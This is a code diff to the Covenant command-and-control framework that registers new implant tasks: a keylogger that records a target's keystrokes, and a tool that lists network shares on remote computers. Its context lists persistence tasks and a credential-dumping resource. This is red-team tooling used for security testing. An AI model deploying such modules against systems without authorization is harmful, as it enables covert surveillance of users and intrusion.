@@ -2155,6 +2155,47 @@ namespace Covenant.Core
                     },
                     new GruntTask
                     {
+                        Name = "Keylogger",
+                        AlternateNames = new List<string>(),
+                        Description = "Monitor a targets keystrokes.",
+                        Code = File.ReadAllText(Path.Combine(Common.CovenantTaskCSharpDirectory, "Keylogger" + ".task")),
+                        Options = new List<GruntTaskOption>
+                        {
+                            new GruntTaskOption
+                            {
+                                Id = 113,
+                                Name = "Time",
+                                Description = "Specifies how long to run the keylogger for.",
+                                Value = "60",
+                                SuggestedValues = new List<string>(),
+                                Optional = false,
+                                DisplayInCommand = false
+                            }
+                        }
+                    },
+                    new GruntTask
+                    {
+                        Name = "GetNetShares",
+                        AlternateNames = new List<string>(),
+                        Description = "Get a list of shares on a remote computer using the Windows API.",
+                        Code = File.ReadAllText(Path.Combine(Common.CovenantTaskCSharpDirectory, "GetNetShares" + ".task")),
+                        Options = new List<GruntTaskOption>
+                        {
+                            new GruntTaskOption
+                            {
+                                Id = 114,
+                                Name = "Servers",
+                                Description = "Specifies the list of servers to enumerate shares on.",
+                                Value = "localhost",
+                                SuggestedValues = new List<string>(),
+                                Optional = false,
+                                DisplayInCommand = false
+                            }
+                        }
+                    },
+
+                    new GruntTask
+                    {
                         Name = "Set",
                         AlternateNames = new List<string>(),
                         Description = "Set a Grunt setting.",
@@ -2164,7 +2205,7 @@ namespace Covenant.Core
                         {
                             new GruntTaskOption
                             {
-                                Id = 113,
+                                Id = 115,
                                 Name = "Setting",
                                 Description = "Setting to set.",
                                 Value = "",
@@ -2174,7 +2215,7 @@ namespace Covenant.Core
                             },
                             new GruntTaskOption
                             {
-                                Id = 114,
+                                Id = 116,
                                 Name = "Value",
                                 Description = "Value to change the option to.",
                                 Value = "",
@@ -2213,7 +2254,7 @@ namespace Covenant.Core
                         {
                             new GruntTaskOption
                             {
-                                Id = 115,
+                                Id = 117,
                                 Name = "ComputerName",
                                 Description = "ComputerName of Grunt to connect to.",
                                 Value = "",
@@ -2223,7 +2264,7 @@ namespace Covenant.Core
                             },
                             new GruntTaskOption
                             {
-                                Id = 116,
+                                Id = 118,
                                 Name = "PipeName",
                                 Description = "PipeName of Grunt to connect to.",
                                 Value = "",
@@ -2244,7 +2285,7 @@ namespace Covenant.Core
                         {
                             new GruntTaskOption
                             {
-                                Id = 117,
+                                Id = 119,
                                 Name = "GruntName",
                                 Description = "Name of Grunt to disconnect from.",
                                 Value = "",
@@ -2264,7 +2305,7 @@ namespace Covenant.Core
                         {
                             new GruntTaskOption
                             {
-                                Id = 118,
+                                Id = 120,
                                 Name = "Code",
                                 Description = "C# code to execute.",
                                 Value = "",
@@ -2284,7 +2325,7 @@ namespace Covenant.Core
                         {
                             new GruntTaskOption
                             {
-                                Id = 119,
+                                Id = 121,
                                 Name = "Script",
                                 Description = "PowerShell Script to import.",
                                 Value = "",
@@ -2304,7 +2345,7 @@ namespace Covenant.Core
                         {
                             new GruntTaskOption
                             {
-                                Id = 120,
+                                Id = 122,
                                 Name = "TaskName",
                                 Description = "The GruntTask name to retrieve help information for.",
                                 SuggestedValues = new List<string>(),
@@ -2376,6 +2417,7 @@ namespace Covenant.Core
     new GruntTaskReferenceSourceLibrary { ReferenceSourceLibrary = ss, GruntTask = await context.GetGruntTaskByName("GetNetLocalGroupMember") },
     new GruntTaskReferenceSourceLibrary { ReferenceSourceLibrary = ss, GruntTask = await context.GetGruntTaskByName("GetNetLoggedOnUser") },
     new GruntTaskReferenceSourceLibrary { ReferenceSourceLibrary = ss, GruntTask = await context.GetGruntTaskByName("GetNetSession") },
+    new GruntTaskReferenceSourceLibrary { ReferenceSourceLibrary = ss, GruntTask = await context.GetGruntTaskByName("GetNetShares") },
     new GruntTaskReferenceSourceLibrary { ReferenceSourceLibrary = ss, GruntTask = await context.GetGruntTaskByName("GetRegistryKey") },
     new GruntTaskReferenceSourceLibrary { ReferenceSourceLibrary = ss, GruntTask = await context.GetGruntTaskByName("SetRegistryKey") },
     new GruntTaskReferenceSourceLibrary { ReferenceSourceLibrary = ss, GruntTask = await context.GetGruntTaskByName("GetRemoteRegistryKey") },
@@ -2386,7 +2428,8 @@ namespace Covenant.Core
     new GruntTaskReferenceSourceLibrary { ReferenceSourceLibrary = ss, GruntTask = await context.GetGruntTaskByName("PersistCOMHijack") },
     new GruntTaskReferenceSourceLibrary { ReferenceSourceLibrary = ss, GruntTask = await context.GetGruntTaskByName("PersistStartup") },
     new GruntTaskReferenceSourceLibrary { ReferenceSourceLibrary = ss, GruntTask = await context.GetGruntTaskByName("PersistAutorun") },
-    new GruntTaskReferenceSourceLibrary { ReferenceSourceLibrary = ss, GruntTask = await context.GetGruntTaskByName("PersistWMI") }
+    new GruntTaskReferenceSourceLibrary { ReferenceSourceLibrary = ss, GruntTask = await context.GetGruntTaskByName("PersistWMI") },
+    new GruntTaskReferenceSourceLibrary { ReferenceSourceLibrary = ss, GruntTask = await context.GetGruntTaskByName("Keylogger") }
                 );
 
                 var er1 = await context.GetEmbeddedResourceByName("SharpSploit.Resources.powerkatz_x64.dll");
@@ -2417,6 +2460,8 @@ namespace Covenant.Core
                 var delete = await context.GetGruntTaskByName("Delete");
                 var kill = await context.GetGruntTaskByName("Kill");
                 var getcurrentdir = await context.GetGruntTaskByName("GetCurrentDirectory");
+                var keylogger = await context.GetGruntTaskByName("Keylogger");
+
                 await context.AddRangeAsync(
     new GruntTaskReferenceAssembly { GruntTask = upload, ReferenceAssembly = await context.GetReferenceAssemblyByName("mscorlib.dll", Common.DotNetVersion.Net35) },
     new GruntTaskReferenceAssembly { GruntTask = upload, ReferenceAssembly = await context.GetReferenceAssemblyByName("mscorlib.dll", Common.DotNetVersion.Net40) },
@@ -2466,7 +2511,11 @@ namespace Covenant.Core
     new GruntTaskReferenceAssembly { GruntTask = screenshot, ReferenceAssembly = await context.GetReferenceAssemblyByName("System.Drawing.dll", Common.DotNetVersion.Net35) },
     new GruntTaskReferenceAssembly { GruntTask = screenshot, ReferenceAssembly = await context.GetReferenceAssemblyByName("System.Drawing.dll", Common.DotNetVersion.Net40) },
     new GruntTaskReferenceAssembly { GruntTask = screenshot, ReferenceAssembly = await context.GetReferenceAssemblyByName("System.Windows.Forms.dll", Common.DotNetVersion.Net35) },
-    new GruntTaskReferenceAssembly { GruntTask = screenshot, ReferenceAssembly = await context.GetReferenceAssemblyByName("System.Windows.Forms.dll", Common.DotNetVersion.Net40) }
+    new GruntTaskReferenceAssembly { GruntTask = screenshot, ReferenceAssembly = await context.GetReferenceAssemblyByName("System.Windows.Forms.dll", Common.DotNetVersion.Net40) },
+    new GruntTaskReferenceAssembly { GruntTask = keylogger, ReferenceAssembly = await context.GetReferenceAssemblyByName("System.dll", Common.DotNetVersion.Net35) },
+    new GruntTaskReferenceAssembly { GruntTask = keylogger, ReferenceAssembly = await context.GetReferenceAssemblyByName("System.dll", Common.DotNetVersion.Net40) },
+    new GruntTaskReferenceAssembly { GruntTask = keylogger, ReferenceAssembly = await context.GetReferenceAssemblyByName("System.Windows.Forms.dll", Common.DotNetVersion.Net35) },
+    new GruntTaskReferenceAssembly { GruntTask = keylogger, ReferenceAssembly = await context.GetReferenceAssemblyByName("System.Windows.Forms.dll", Common.DotNetVersion.Net40) }
 
                 );
             }
